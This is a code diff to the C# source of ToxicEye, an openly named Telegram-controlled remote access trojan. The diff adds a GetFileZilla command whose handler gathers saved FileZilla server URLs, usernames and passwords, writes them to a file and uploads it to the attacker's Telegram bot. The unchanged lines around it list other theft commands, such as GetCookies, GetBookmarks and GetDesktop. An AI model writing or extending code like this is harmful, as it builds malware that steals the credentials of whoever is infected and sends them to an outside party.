@@ -97,6 +97,7 @@ namespace TelegramRAT
                             "\n /GetBookmarks" +
                             "\n /GetCookies" +
                             "\n /GetDesktop" +
+                            "\n /GetFileZilla" +
                             "\n" +
                             "\n💿 CD-ROM:" +
                             "\n /OpenCD" +
@@ -156,7 +157,7 @@ namespace TelegramRAT
                 case "ABOUT":
                     {
                         telegram.sendText(
-                            "\n👻 ToxicEye" +
+                            "\n🦠 ToxicEye" +
                             "\n👑 Coded by LimerBoy" +
                             "\n🔮 github.com/LimerBoy" +
                             "");
@@ -681,8 +682,23 @@ namespace TelegramRAT
                         GrabDesktop.get();
                         break;
                     }
-
-
+                // GetFileZilla
+                case "GETFILEZILLA":
+                    {
+                        string filename = "filezilla.txt";
+                        string output = "[FILEZILLA SERVERS]\n\n";
+                        var filezilla = FileZilla.get();
+                        foreach (Dictionary<string, string> data in filezilla)
+                        {
+                            output += "URL: " + data["url"] + "\n"
+                                   + "USERNAME: " + data["username"] + "\n"
+                                   + "PASSWORD: " + data["password"] + "\n"
+                                   + "\n";
+                        }
+                        File.WriteAllText(filename, output);
+                        telegram.UploadFile(filename, true);
+                        break;
+                    }
 
                 // OpenCD <letter/none>
                 case "OPENCD":
